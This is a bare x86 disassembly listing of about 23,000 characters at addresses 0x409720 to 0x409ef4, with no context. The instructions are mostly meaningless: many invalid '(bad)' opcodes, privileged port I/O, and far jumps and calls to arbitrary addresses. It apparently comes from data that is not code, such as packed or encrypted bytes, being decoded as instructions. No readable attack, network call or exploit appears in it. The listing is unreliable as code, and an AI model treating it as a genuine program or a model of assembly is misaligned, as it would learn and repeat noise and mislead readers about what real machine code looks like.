  409720:	shr    BYTE PTR [eax-0x2da889ab],0xe7
  409727:	popf   
  409728:	ret    0xbe31
  40972b:	ffreep st(6)
  40972d:	imul   esi,DWORD PTR [ebx-0x36e13326],0x1dded7f6
  409737:	iret   
  409738:	sbb    al,0x9b
  40973a:	xor    BYTE PTR [edx-0x7d],bh
  40973d:	cmp    al,0x44
  40973f:	mov    ds,WORD PTR [edi-0x4b272f65]
  409745:	das    
  409746:	sbb    BYTE PTR [esi-0x109ba836],ch
  40974c:	mov    ds:0xfc642758,eax
  409751:	mov    ah,0x72
  409753:	fld    TBYTE PTR [esi+eiz*8]
  409756:	pop    ds
  409757:	cmp    BYTE PTR [esi],bh
  409759:	sub    al,BYTE PTR [edi+0x9c1cdd3]
  40975f:	dec    ebx
  409760:	(bad)  
  409762:	loop   0x4097a3
  409764:	mov    BYTE PTR [eax],bh
  409766:	aaa    
  409767:	and    eax,0x16aff3a2
  40976c:	add    dh,al
  40976e:	ret    
  40976f:	mov    ss,WORD PTR [esi]
  409771:	clc    
  409772:	dec    ebx
  409773:	pop    ecx
  409774:	ror    DWORD PTR [eax+0x2],1
  409777:	push   edi
  409778:	push   es
  409779:	inc    esp
  40977a:	inc    esp
  40977b:	mov    dl,0xa6
  40977d:	lahf   
  40977e:	fidivr DWORD PTR [edi-0x4688879a]
  409784:	pop    ebx
  409785:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409786:	dec    DWORD PTR [ebx+edx*2-0x5c]
  40978a:	sbb    eax,0xffe44548
  40978f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409790:	adc    edx,DWORD PTR [edi+0x62514f12]
  409796:	sahf   
  409797:	push   ds
  409798:	and    bl,BYTE PTR [edi-0x5276dcb8]
  40979e:	fwait
  40979f:	add    edi,DWORD PTR [edi-0x55d2af06]
  4097a5:	jo     0x4097c9
  4097a7:	mov    bh,BYTE PTR [esi+0x5e]
  4097aa:	int3   
  4097ab:	nop
  4097ac:	ins    BYTE PTR es:[edi],dx
  4097ad:	jmp    0x4097d2
  4097af:	and    edx,DWORD PTR [esi+0x4788652d]
  4097b5:	fcomp  QWORD PTR [esi]
  4097b7:	jnp    0x40979b
  4097b9:	test   DWORD PTR [ecx+eax*8+0x6c],edx
  4097bd:	mov    es,WORD PTR [esi]
  4097bf:	je     0x4097ae
  4097c1:	dec    esi
  4097c2:	push   ecx
  4097c3:	dec    eax
  4097c4:	jmp    0xebbde590
  4097c9:	(bad)  
  4097ca:	cdq    
  4097cb:	mov    cl,0x23
  4097cd:	sub    BYTE PTR [ebx-0x1b],bl
  4097d0:	repz sub esi,DWORD PTR [esi-0x18]
  4097d4:	iret   
  4097d5:	ret    0x6434
  4097d8:	cli    
  4097d9:	dec    esp
  4097da:	pop    ds
  4097db:	xchg   ebp,eax
  4097dc:	mov    eax,ds:0x262fa59c
  4097e1:	fidiv  WORD PTR [edi-0x17]
  4097e4:	aaa    
  4097e5:	push   esp
  4097e6:	xchg   ebx,eax
  4097e7:	and    BYTE PTR [esp+edi*8],0xc9
  4097eb:	push   es
  4097ec:	sub    bl,BYTE PTR [ebx-0x42]
  4097ef:	mov    cl,0x5e
  4097f1:	sar    DWORD PTR [ebx],cl
  4097f3:	add    eax,0x69cdbd2c
  4097f8:	pop    esp
  4097f9:	fnsetpm(287 only) 
  4097fb:	xchg   BYTE PTR [eax],ah
  4097fd:	scas   eax,DWORD PTR es:[edi]
  4097fe:	test   DWORD PTR [esi+eax*8-0x3c1a7788],esp
  409805:	cmc    
  409806:	pop    es
  409807:	repnz jmp 0xdecb:0x4f4bf3ce
  40980f:	xlat   BYTE PTR ds:[ebx]
  409810:	jne    0x40981f
  409812:	xor    ebp,DWORD PTR [ecx+0x34]
  409815:	xchg   ebx,eax
  409816:	pop    esp
  409817:	scas   eax,DWORD PTR es:[edi]
  409818:	call   0x8a04:0x8cf46a70
  40981f:	jge    0x40984e
  409821:	xchg   edi,eax
  409822:	mov    dl,0x9a
  409824:	mov    ah,dl
  409826:	and    al,0x4a
  409828:	test   BYTE PTR [ebx-0x6a9f55ab],cl
  40982e:	cmc    
  40982f:	dec    esp
  409830:	out    0x87,eax
  409832:	mov    ebx,0x972d377f
  409837:	and    dh,BYTE PTR [ebp+esi*4-0x23]
  40983b:	push   ss
  40983c:	xor    eax,0x823d2df8
  409841:	push   eax
  409842:	jmp    0x409897
  409844:	pop    ds
  409845:	mov    eax,0x2cf74579
  40984a:	sbb    eax,0x926cb312
  40984f:	lahf   
  409850:	daa    
  409851:	test   DWORD PTR [eax+0x45],0xcc71185a
  409858:	xchg   edi,eax
  409859:	xchg   DWORD PTR [edx+0x4efa3740],edx
  40985f:	shl    BYTE PTR [ecx],0x5c
  409862:	(bad)  
  409863:	cld    
  409864:	add    DWORD PTR [esi],0x86b760c4
  40986a:	(bad)  
  40986b:	out    dx,eax
  40986c:	add    al,0xba
  40986e:	ret    0xdba8
  409871:	loopne 0x409815
  409873:	mov    ch,0x16
  409875:	xchg   ebp,eax
  409876:	xor    BYTE PTR [ebp-0x5],0x40
  40987a:	stos   DWORD PTR es:[edi],eax
  40987b:	xchg   al,bl
  40987d:	and    al,0x97
  40987f:	lods   al,BYTE PTR ds:[esi]
  409880:	mov    ebp,0x4e2f83c4
  409885:	xor    ecx,DWORD PTR [edi-0x1d83ca06]
  40988b:	xchg   ecx,eax
  40988c:	inc    esp
  40988d:	sahf   
  40988e:	mov    eax,0x1c84c0fd
  409893:	shl    DWORD PTR [edi+0x40],1
  409896:	xor    ah,bl
  409898:	push   esp
  409899:	stos   DWORD PTR es:[edi],eax
  40989a:	push   ds
  40989b:	ss fsubr st,st(7)
  40989e:	mov    bh,0xf4
  4098a0:	call   0x60d82a4e
  4098a5:	mov    ds:0xd805fc59,eax
  4098aa:	(bad)  
  4098ab:	mov    ecx,0xc77414d6
  4098b0:	pop    ds
  4098b1:	je     0x40990b
  4098b3:	sub    bh,dh
  4098b5:	sub    eax,0x747cd282
  4098ba:	and    edi,esi
  4098bc:	pop    edi
  4098bd:	paddq  mm2,QWORD PTR [ebx]
  4098c0:	and    al,0x4e
  4098c2:	shr    BYTE PTR [edx+0x4d],0x9f
  4098c6:	and    BYTE PTR [edx-0x46],0xde
  4098ca:	xchg   BYTE PTR [edi],bh
  4098cc:	fmul   DWORD PTR [esi-0x35141b11]
  4098d2:	test   eax,0xa8075a43
  4098d7:	push   0xa76493af
  4098dc:	inc    esi
  4098dd:	daa    
  4098de:	sbb    bl,BYTE PTR [ebp-0x6a]
  4098e1:	mov    ds:0x7e35b435,eax
  4098e6:	fist   DWORD PTR [ebx-0x1e]
  4098e9:	lods   al,BYTE PTR ds:[esi]
  4098ea:	jno    0x409913
  4098ec:	imul   ecx,esi,0x5a4bcc77
  4098f2:	sbb    BYTE PTR [ecx-0x52],al
  4098f5:	mov    al,BYTE PTR [esi-0x491ca639]
  4098fb:	push   ecx
  4098fc:	cdq    
  4098fd:	xchg   edi,eax
  4098fe:	jmp    0x4401e1d2
  409903:	xor    ecx,DWORD PTR [esi-0x29]
  409906:	sbb    al,0xf1
  409908:	mov    al,0x47
  40990a:	jl     0x409958
  40990c:	adc    ah,bl
  40990e:	inc    edx
  40990f:	test   DWORD PTR [ecx-0x3a],0x2d1aea79
  409916:	ror    BYTE PTR [edx-0xb963df2],0xad
  40991d:	jecxz  0x40998e
  40991f:	ss loope 0x4098cf
  409922:	retf   0xc1f3
  409925:	mov    edx,0xa1016999
  40992a:	push   0xffffffd2
  40992c:	ret    
  40992d:	jne    0x409986
  40992f:	push   eax
  409930:	das    
  409931:	into   
  409932:	jb     0x4098d5
  409934:	pop    edi
  409935:	sub    BYTE PTR [edx],bh
  409937:	cmp    ebp,DWORD PTR [edx+0x6d]
  40993a:	clc    
  40993b:	cld    
  40993c:	mov    DWORD PTR [ebx],esi
  40993e:	imul   esi
  409940:	pop    ebx
  409941:	imul   dl
  409943:	jns    0x4099a2
  409945:	mov    cl,0x11
  409947:	add    DWORD PTR [eax+0x19c48641],0xffffffe0
  40994e:	in     al,0x81
  409950:	xor    DWORD PTR [esi],esp
  409952:	stos   DWORD PTR es:[edi],eax
  409953:	imul   ecx,DWORD PTR [eax+ecx*1-0x50],0xffffffdc
  409958:	xchg   edx,eax
  409959:	xchg   esi,eax
  40995a:	arpl   si,bx
  40995c:	ins    BYTE PTR es:[edi],dx
  40995d:	xchg   esp,eax
  40995e:	ret    0x81c4
  409961:	call   DWORD PTR [eax-0x29]
  409964:	ss pop eax
  409966:	add    DWORD PTR [eax+0x383ca0aa],ecx
  40996c:	rol    BYTE PTR [ebx+edx*8+0x40a1ef00],1
  409973:	push   esi
  409974:	into   
  409975:	xlat   BYTE PTR ds:[ebx]
  409976:	and    eax,0xb79bc46a
  40997b:	push   esi
  40997c:	jmp    0x6417:0xf1787c1f
  409983:	call   0x6e31:0x584fa75c
  40998a:	(bad)  
  40998b:	iret   
  40998c:	lods   al,BYTE PTR ds:[esi]
  40998d:	sahf   
  40998e:	mov    esp,0x7904aa3a
  409993:	mov    edi,0xe218b4aa
  409998:	les    edi,FWORD PTR [ebx]
  40999a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40999b:	pop    ss
  40999c:	ror    ebx,1
  40999e:	lea    esi,[ebx+0x5b]
  4099a1:	icebp  
  4099a2:	dec    esp
  4099a3:	pushf  
  4099a4:	mov    esp,ecx
  4099a6:	jge    0x409974
  4099a8:	dec    ebp
  4099a9:	rol    BYTE PTR [eax-0x69166a42],cl
  4099af:	xor    al,0xec
  4099b1:	mov    ah,0xa
  4099b3:	cmp    DWORD PTR [edi+0x71],0x2
  4099b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4099b8:	sbb    eax,0x968c3290
  4099bd:	dec    ebx
  4099be:	jge    0x409a2a
  4099c0:	clc    
  4099c1:	add    ebx,DWORD PTR [ebx]
  4099c3:	call   0xb62e:0x2d07b44c
  4099ca:	xlat   BYTE PTR ds:[ebx]
  4099cb:	cmp    eax,0x11d38467
  4099d0:	sbb    BYTE PTR [edi-0x4a],0x22
  4099d4:	mov    cl,0x77
  4099d6:	imul   ecx,DWORD PTR [eax-0x2a],0xffffffab
  4099da:	idiv   DWORD PTR [ecx-0x4af385df]
  4099e0:	dec    ebx
  4099e1:	in     eax,dx
  4099e2:	adc    ecx,DWORD PTR [ebp+edi*2-0x1afe8abe]
  4099e9:	cmp    ebp,DWORD PTR [ebp-0x2a]
  4099ec:	mov    ebx,0x267454e9
  4099f1:	ret    0x2075
  4099f4:	mov    ds:0xda5d51c8,al
  4099f9:	xchg   esp,eax
  4099fa:	inc    ecx
  4099fb:	push   0xfe4b4788
  409a00:	je     0x409a2e
  409a02:	arpl   WORD PTR [eax-0x4faf87ff],ax
  409a08:	adc    BYTE PTR [esi+eiz*2],al
  409a0b:	cs add esi,0x4c
  409a0f:	xor    edx,DWORD PTR [edi-0x3c186af1]
  409a15:	mov    ds:0x84412acb,al
  409a1a:	jecxz  0x409a42
  409a1c:	mov    esi,0xfbf92ad5
  409a21:	or     DWORD PTR [edi+ecx*1],ebx
  409a24:	push   edx
  409a25:	hlt    
  409a26:	mov    edx,0x6d84fa41
  409a2b:	and    edx,DWORD PTR [eax]
  409a2d:	inc    ebp
  409a2e:	and    DWORD PTR [ebp-0x2a29142b],0xe0603005
  409a38:	addr16 or dl,0xf6
  409a3c:	aad    0x0
  409a3e:	mov    cl,0x16
  409a40:	mov    DWORD PTR [ecx+0x75],esi
  409a43:	or     al,0xb8
  409a45:	jb     0x409a41
  409a47:	into   
  409a48:	pusha  
  409a49:	jge    0x409a5c
  409a4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a4c:	out    0x3c,al
  409a4e:	(bad)  
  409a4f:	das    
  409a50:	jl     0x409a4e
  409a52:	scas   eax,DWORD PTR es:[edi]
  409a53:	outs   dx,BYTE PTR ds:[esi]
  409a54:	(bad)  
  409a55:	out    dx,eax
  409a56:	jmp    0x409a80
  409a58:	enter  0x6639,0xe6
  409a5c:	cmp    al,0xae
  409a5e:	adc    dh,BYTE PTR ds:0x8db9dc52
  409a64:	outs   dx,BYTE PTR ds:[esi]
  409a65:	sbb    dh,0xf0
  409a68:	xor    dl,bh
  409a6a:	div    bl
  409a6c:	ret    0xe397
  409a6f:	cli    
  409a70:	dec    ecx
  409a71:	pop    ds
  409a72:	icebp  
  409a73:	ins    BYTE PTR es:[edi],dx
  409a74:	or     esp,eax
  409a76:	and    eax,0x378b73cc
  409a7b:	mov    ds:0x7cf08929,eax
  409a80:	les    esi,FWORD PTR [edi]
  409a82:	ss mov ecx,0xb315d4ca
  409a88:	mov    DWORD PTR [ebx-0x70bc07bb],esp
  409a8e:	out    dx,al
  409a8f:	mov    al,0x26
  409a91:	push   esi
  409a92:	retf   
  409a93:	sahf   
  409a94:	mov    ecx,0x40a78bcc
  409a99:	rcr    BYTE PTR [ebp+0x10],1
  409a9c:	mov    ds,WORD PTR [edi]
  409a9e:	sub    ebp,DWORD PTR [ebx+0x16]
  409aa1:	fld    TBYTE PTR [esi+0x1747b139]
  409aa7:	mov    dl,0xf4
  409aa9:	inc    eax
  409aaa:	xchg   edx,eax
  409aab:	mov    ds:0x69d943ab,eax
  409ab0:	bound  ebp,QWORD PTR [ecx+eiz*2+0x18]
  409ab4:	mov    ecx,0xb50dea86
  409ab9:	xchg   ecx,eax
  409aba:	dec    ecx
  409abb:	push   ebp
  409abc:	jle    0x409ab3
  409abe:	sbb    eax,0x3430e691
  409ac3:	sbb    DWORD PTR [ecx+ecx*2],edi
  409ac6:	jmp    0x3e097991
  409acb:	jbe    0x409a68
  409acd:	int3   
  409ace:	dec    esi
  409acf:	sbb    eax,0xf7db0118
  409ad4:	fiadd  DWORD PTR [edi-0x25]
  409ad7:	and    eax,0xcf038923
  409adc:	xchg   edi,eax
  409add:	gs or  bh,ah
  409ae0:	jle    0x409b40
  409ae2:	and    eax,0xc2a4e0a6
  409ae7:	in     al,0x9e
  409ae9:	(bad)  
  409aea:	xchg   ebx,eax
  409aeb:	push   0xe
  409aed:	js     0x409b0c
  409aef:	fild   WORD PTR [ebx-0x17]
  409af2:	mov    al,0xa6
  409af4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409af5:	add    esi,DWORD PTR [ecx-0x36e54bd2]
  409afb:	jne    0x409a7f
  409afd:	stos   DWORD PTR es:[edi],eax
  409afe:	ins    DWORD PTR es:[edi],dx
  409aff:	push   ebp
  409b00:	dec    ecx
  409b01:	outs   dx,BYTE PTR ds:[esi]
  409b02:	xchg   ebx,eax
  409b03:	imul   ebp,DWORD PTR [esi+0x3ed8527b],0xffffffb5
  409b0a:	call   0x4bc64174
  409b0f:	xchg   edi,eax
  409b10:	push   0x13
  409b12:	dec    ebp
  409b13:	loop   0x409acc
  409b15:	lea    ebx,[ebp-0x68e353bf]
  409b1b:	stos   BYTE PTR es:[edi],al
  409b1c:	inc    esp
  409b1d:	inc    ebx
  409b1e:	xor    ebx,DWORD PTR [edi-0x377b1ea2]
  409b24:	out    dx,al
  409b25:	adc    al,0xf3
  409b27:	pop    eax
  409b28:	jecxz  0x409ba5
  409b2a:	push   eax
  409b2b:	or     ebp,edx
  409b2d:	add    esp,DWORD PTR [edx]
  409b2f:	lods   al,BYTE PTR ds:[esi]
  409b30:	enter  0x453c,0xd4
  409b34:	or     al,0x5d
  409b36:	loop   0x409ac4
  409b38:	fwait
  409b39:	(bad)  
  409b3a:	aas    
  409b3b:	mov    eax,0xc9f073ea
  409b40:	jp     0x409b51
  409b42:	xchg   edi,eax
  409b43:	int    0xbd
  409b45:	mov    edi,esp
  409b47:	pop    ds
  409b48:	retf   
  409b49:	jmp    0x8a28:0x31e7c274
  409b50:	lahf   
  409b51:	into   
  409b52:	shl    BYTE PTR [ebp+0x46],0x5d
  409b56:	test   eax,0x62a7043e
  409b5b:	retf   
  409b5c:	(bad)  
  409b5e:	ror    DWORD PTR cs:[esp+ecx*8-0x262a3806],0xe9
  409b67:	test   ax,0xd238
  409b6b:	xchg   BYTE PTR [edi+0xd],ch
  409b6e:	enter  0x88d2,0xc9
  409b72:	ret    
  409b73:	inc    ebp
  409b74:	mov    dh,0x65
  409b76:	(bad)  
  409b77:	fwait
  409b78:	jno    0x409bed
  409b7a:	xor    al,0x9a
  409b7c:	in     eax,dx
  409b7d:	(bad)  
  409b7e:	xor    cl,BYTE PTR [esi]
  409b80:	xchg   esi,eax
  409b81:	fiadd  DWORD PTR [ebp+ebp*4+0x52d6495d]
  409b88:	js     0x409b0e
  409b8a:	jb     0x409bb8
  409b8c:	xchg   edi,eax
  409b8d:	fs sub al,0x9c
  409b90:	push   edx
  409b91:	mov    edi,0xb036262d
  409b96:	jne    0x409bc3
  409b98:	rcl    DWORD PTR [ebp-0x19],0x24
  409b9c:	dec    eax
  409b9d:	stc    
  409b9e:	(bad)  
  409ba0:	pop    esp
  409ba1:	add    al,0x77
  409ba3:	push   esi
  409ba4:	xor    BYTE PTR [edx+0x1fdbc4e],dh
  409baa:	not    ebp
  409bac:	ficom  DWORD PTR [esi]
  409bae:	cmp    DWORD PTR ds:0x7077a961,esi
  409bb4:	adc    BYTE PTR [edi],bh
  409bb6:	mov    ebx,ebx
  409bb8:	pop    esp
  409bb9:	pop    ss
  409bba:	enter  0xef0f,0x6e
  409bbe:	scas   eax,DWORD PTR es:[edi]
  409bbf:	gs push edx
  409bc1:	call   0x2ab9d3fe
  409bc6:	and    al,0x42
  409bc8:	push   ecx
  409bc9:	adc    eax,ebx
  409bcb:	cwde   
  409bcc:	fdivr  st,st(2)
  409bce:	loop   0x409b83
  409bd0:	sub    cl,BYTE PTR [edi]
  409bd2:	outs   dx,BYTE PTR ds:[esi]
  409bd3:	cli    
  409bd4:	jno    0x409bd3
  409bd6:	mov    esp,0x7a53d35e
  409bdb:	(bad)
  409bde:	loopne 0x409b8f
  409be0:	out    dx,eax
  409be1:	jae    0x409b81
  409be3:	inc    esi
  409be4:	push   cs
  409be5:	inc    edi
  409be6:	je     0x409bc2
  409be8:	pop    ds
  409be9:	loopne 0x409bb6
  409beb:	fxch   st(2)
  409bed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409bee:	fiadd  WORD PTR es:[esp+edx*4+0x8]
  409bf3:	inc    ebx
  409bf4:	add    DWORD PTR [edi+0x9],0xffffffae
  409bf8:	add    al,0x9c
  409bfa:	xor    dh,BYTE PTR [ecx-0x5b]
  409bfd:	pop    esi
  409bfe:	adc    edx,DWORD PTR [edi]
  409c00:	jne    0x409bc6
  409c02:	xchg   DWORD PTR ss:[esi],esi
  409c05:	xor    eax,0x38299138
  409c0a:	sbb    DWORD PTR [edx],ecx
  409c0c:	inc    esp
  409c0d:	dec    edi
  409c0e:	popa   
  409c0f:	addr16 push esp
  409c11:	dec    esp
  409c12:	pop    esp
  409c13:	xor    al,0x4b
  409c15:	test   BYTE PTR [esi+0x3c],0xd5
  409c19:	stos   DWORD PTR es:[edi],eax
  409c1a:	gs stos DWORD PTR es:[edi],eax
  409c1c:	pushf  
  409c1d:	or     al,0xe
  409c1f:	call   0xc5a22bf4
  409c24:	shl    BYTE PTR [ebp-0x5],1
  409c27:	jo     0x409c28
  409c29:	lods   eax,DWORD PTR ds:[esi]
  409c2a:	sub    eax,0xb57eb8ac
  409c2f:	mov    dl,0xd2
  409c31:	xlat   BYTE PTR ds:[ebx]
  409c32:	(bad)  
  409c33:	into   
  409c34:	mov    dh,bl
  409c36:	mov    ds:0x1aae6097,al
  409c3b:	sub    esi,DWORD PTR [ebx]
  409c3d:	int    0x1f
  409c3f:	call   0x4391:0x8877b8c8
  409c46:	jmp    0x409c1c
  409c48:	sub    ecx,0xee9e372c
  409c4e:	jbe    0x409c82
  409c50:	pop    esi
  409c51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c52:	mov    edi,0x41e0dafc
  409c57:	stos   DWORD PTR es:[edi],eax
  409c58:	retf   0xe595
  409c5b:	jge    0x409c70
  409c5d:	jle    0x409c51
  409c5f:	and    DWORD PTR [esi+0x7d],eax
  409c62:	out    dx,eax
  409c63:	clc    
  409c64:	xchg   esp,eax
  409c65:	ret    
  409c66:	mov    BYTE PTR [ecx+ebp*1-0x4d69adb4],ch
  409c6d:	(bad)  
  409c6e:	mov    ebp,0x4e8abf0a
  409c73:	ret    0x1767
  409c76:	adc    ebp,esp
  409c78:	addr16 mov esi,0xed7a5833
  409c7e:	popa   
  409c7f:	pop    edx
  409c80:	loopne 0x409c74
  409c82:	shl    DWORD PTR [ebp+0x3c],cl
  409c85:	xor    dh,BYTE PTR [edi+0x29]
  409c88:	jnp    0x409c6c
  409c8a:	mov    eax,0x89ceb886
  409c8f:	or     al,0xb0
  409c91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c92:	add    esi,DWORD PTR [ecx-0x33efbcfb]
  409c98:	sbb    al,0x90
  409c9a:	push   ds
  409c9b:	xor    ebp,DWORD PTR [edi-0x5c7f3b98]
  409ca1:	sub    eax,0x802eb114
  409ca6:	add    ecx,DWORD PTR [ebp-0x7641a7f1]
  409cac:	pop    ebp
  409cad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cae:	in     al,dx
  409caf:	xor    DWORD PTR [esi],ebx
  409cb1:	pop    ebp
  409cb2:	pop    eax
  409cb3:	test   eax,0xb7fb0376
  409cb8:	icebp  
  409cb9:	fucom  st(2)
  409cbb:	and    esi,DWORD PTR [edi]
  409cbd:	adc    eax,0x3a5be881
  409cc2:	test   ch,0xcd
  409cc5:	push   ecx
  409cc6:	pop    es
  409cc7:	push   0x7e
  409cc9:	xchg   esp,eax
  409cca:	mov    edi,0x33348465
  409ccf:	jno    0x409d17
  409cd1:	aaa    
  409cd2:	stc    
  409cd3:	iret   
  409cd4:	std    
  409cd5:	fcmovnb st,st(7)
  409cd7:	adc    BYTE PTR [ebx],bl
  409cd9:	mov    ecx,0xfa719bcf
  409cde:	push   ebp
  409cdf:	jmp    0xada5:0xf8ba9466
  409ce6:	shl    ebx,0x7f
  409ce9:	daa    
  409cea:	fadd   QWORD PTR [ecx]
  409cec:	dec    edx
  409ced:	inc    esi
  409cee:	out    dx,eax
  409cef:	loop   0x409d47
  409cf1:	and    ebx,DWORD PTR [ecx-0x3ee2c92a]
  409cf7:	fcomp  QWORD PTR [ecx+0x1a0faeac]
  409cfd:	rol    esp,0x52
  409d00:	lods   eax,DWORD PTR ds:[esi]
  409d01:	pop    esp
  409d02:	add    al,0xd3
  409d04:	or     ch,dl
  409d06:	rcr    bh,1
  409d08:	mov    edi,0x2be6d103
  409d0d:	pop    ss
  409d0e:	mov    ds:0x7f91e21e,eax
  409d13:	js     0x409cde
  409d15:	std    
  409d16:	mov    eax,ds:0x17d0577f
  409d1b:	test   BYTE PTR [ebp+0x5],dh
  409d1e:	mov    ds:0xa09bfa59,al
  409d23:	sbb    eax,0xcace4183
  409d28:	mov    ecx,0x60f414ad
  409d2d:	mov    BYTE PTR [esi],dh
  409d2f:	rcl    eax,0xf6
  409d32:	call   0x32a9:0xa4d583a3
  409d39:	push   0x913ed0ca
  409d3e:	sub    BYTE PTR [ecx-0x7f],dh
  409d41:	rcl    BYTE PTR [ebx+eax*8-0x68],cl
  409d45:	(bad)  
  409d46:	jmp    0xb32a5ecf
  409d4b:	or     ebx,DWORD PTR [esi+eax*8-0x2e1134ec]
  409d52:	lods   eax,DWORD PTR ds:[esi]
  409d53:	imul   ebp,DWORD PTR [edx-0x56ab3228],0x5ed531cb
  409d5d:	jns    0x409d11
  409d5f:	std    
  409d60:	fisttp DWORD PTR ds:0x3c48e34a
  409d66:	nop
  409d67:	test   DWORD PTR [esi+eiz*1-0x1e],ebp
  409d6b:	xor    edx,esi
  409d6d:	scas   eax,DWORD PTR es:[edi]
  409d6e:	xor    DWORD PTR [ebp+0x36],esi
  409d71:	inc    edi
  409d72:	ret    
  409d73:	push   ebp
  409d74:	adc    BYTE PTR [ebp-0x3a],bl
  409d77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d78:	aad    0xad
  409d7a:	mov    bl,0x90
  409d7c:	loopne 0x409d02
  409d7e:	jecxz  0x409de3
  409d80:	pop    esp
  409d81:	mov    cl,0xa5
  409d83:	daa    
  409d84:	cld    
  409d85:	jb     0x409d81
  409d87:	(bad)  
  409d88:	je     0x409d88
  409d8a:	lods   eax,DWORD PTR ds:[esi]
  409d8b:	add    ch,cl
  409d8d:	sbb    al,0xe6
  409d8f:	push   es
  409d90:	test   al,0xb8
  409d92:	mov    ds:0x56e6e0cd,eax
  409d97:	retf   0xe684
  409d9a:	sti    
  409d9b:	cmp    BYTE PTR [ecx-0x55],al
  409d9e:	(bad)  
  409d9f:	fdivr  QWORD PTR [ebx-0x7c]
  409da2:	push   ebx
  409da3:	dec    edi
  409da4:	test   BYTE PTR [eax+0x56],dl
  409da7:	es mov cl,0x9
  409daa:	out    dx,eax
  409dab:	ds xchg esi,eax
  409dad:	mov    WORD PTR [esi-0x12],?
  409db0:	mov    bl,0x1c
  409db2:	xchg   ebp,eax
  409db3:	scas   al,BYTE PTR es:[edi]
  409db4:	fsqrt  
  409db6:	dec    esp
  409db7:	add    bh,dl
  409db9:	fsubr  st,st(3)
  409dbb:	(bad)  ds:0xa735d01a
  409dc1:	ds cmp al,0x13
  409dc4:	aad    0x22
  409dc6:	stc    
  409dc7:	(bad)  [edi]
  409dc9:	or     dh,BYTE PTR [esi]
  409dcb:	int3   
  409dcc:	mov    ebp,0x6e619014
  409dd1:	jge    0x409e33
  409dd3:	mov    bl,0x9a
  409dd5:	loop   0x409d77
  409dd7:	in     eax,dx
  409dd8:	xor    al,BYTE PTR [ecx-0x242f8313]
  409dde:	js     0x409e5d
  409de0:	nop
  409de1:	jns    0x409d74
  409de3:	mov    BYTE PTR [ebx+edi*4],cl
  409de6:	in     eax,0x31
  409de8:	ds mov al,0x41
  409deb:	js     0x409d71
  409ded:	xor    eax,0x1452dbc1
  409df2:	push   cs
  409df3:	or     edi,DWORD PTR [edx]
  409df5:	repz cmc 
  409df7:	aam    0x3f
  409df9:	and    eax,0x72273099
  409dfe:	adc    eax,0x88d0ab97
  409e03:	pop    eax
  409e04:	and    BYTE PTR [edx+0x3e],0xd7
  409e08:	mov    al,ds:0x27aa94db
  409e0d:	cld    
  409e0e:	push   0x64
  409e10:	push   eax
  409e11:	arpl   dx,bx
  409e13:	repnz inc edi
  409e15:	mov    esi,eax
  409e17:	and    al,0x41
  409e19:	xor    edx,DWORD PTR [edi+0x0]
  409e1c:	sub    BYTE PTR [edi-0x149cf36],ch
  409e22:	push   ebp
  409e23:	inc    edx
  409e24:	bndldx bnd1,[eax]
  409e27:	mov    ecx,0xcc298891
  409e2c:	call   0x7a85:0x9cc548d
  409e33:	cmp    eax,0x6d51cc50
  409e38:	pop    ss
  409e39:	iret   
  409e3a:	les    ebx,FWORD PTR [ecx+0x6e]
  409e3d:	scas   eax,DWORD PTR es:[edi]
  409e3e:	pop    esi
  409e3f:	(bad)  
  409e40:	in     al,dx
  409e41:	xor    ebp,edx
  409e43:	jae    0x409e4a
  409e45:	cmp    al,0xbb
  409e47:	push   ss
  409e48:	push   es
  409e49:	arpl   WORD PTR [edx],dx
  409e4b:	or     ecx,DWORD PTR [esi+esi*1+0xe227a6d]
  409e52:	sbb    al,0x87
  409e54:	std    
  409e55:	loope  0x409e60
  409e57:	or     DWORD PTR [esi-0x76],ecx
  409e5a:	sbb    al,0x12
  409e5c:	in     eax,0xad
  409e5e:	daa    
  409e5f:	fwait
  409e60:	mov    esp,0x16159a2
  409e65:	adc    eax,0x4aed56c3
  409e6a:	imul   ebx,DWORD PTR [ebx+0x6f],0xd57284ba
  409e71:	jl     0x409dfb
  409e73:	jge    0x409e05
  409e75:	fst    DWORD PTR ds:0xdb09d36b
  409e7b:	js     0x409e09
  409e7d:	int3   
  409e7e:	push   esp
  409e7f:	retf   0x82bc
  409e82:	fwait
  409e83:	call   0xd26:0xbb8d545e
  409e8a:	pop    esi
  409e8b:	mov    ds:0x351f9d45,al
  409e90:	mov    DWORD PTR [esi-0x2f6eaa82],ecx
  409e96:	arpl   WORD PTR [edi+0x430b95f8],sp
  409e9c:	sub    edx,DWORD PTR [eax]
  409e9e:	dec    esi
  409e9f:	outs   dx,BYTE PTR ds:[esi]
  409ea0:	ins    DWORD PTR es:[edi],dx
  409ea1:	mov    cl,0xd2
  409ea3:	add    DWORD PTR [ecx+0x17],edi
  409ea6:	mov    edx,ebx
  409ea8:	push   ss
  409ea9:	pop    eax
  409eaa:	sar    dh,1
  409eac:	sub    DWORD PTR [ebp+0x4bfc7dfa],0x20
  409eb3:	ds nop
  409eb5:	sbb    DWORD PTR [ebp-0x5a8d1ecb],ecx
  409ebb:	and    esi,DWORD PTR [edi+0x69]
  409ebe:	jnp    0x409ee6
  409ec0:	fucomp st(7)
  409ec2:	and    BYTE PTR [ebx-0x1a6f315f],0x95
  409ec9:	test   DWORD PTR [edi+0x7f],esi
  409ecc:	pusha  
  409ecd:	adc    al,0xda
  409ecf:	mov    bh,0x60
  409ed1:	dec    edi
  409ed2:	cmp    dh,cl
  409ed4:	sub    al,0xf5
  409ed6:	mov    edx,0x662274d4
  409edb:	jge    0x409f13
  409edd:	jns    0x409e80
  409edf:	inc    ebx
  409ee0:	pop    esi
  409ee1:	repz daa 
  409ee3:	popa   
  409ee4:	inc    eax
  409ee5:	add    eax,0x9a182368
  409eea:	sub    cl,BYTE PTR [edi+0x68ade0fd]
  409ef0:	stc    
  409ef1:	ret    
  409ef2:	inc    esi
  409ef3:	outs   dx,DWORD PTR ds:[esi]
  409ef4:	repz (bad) 
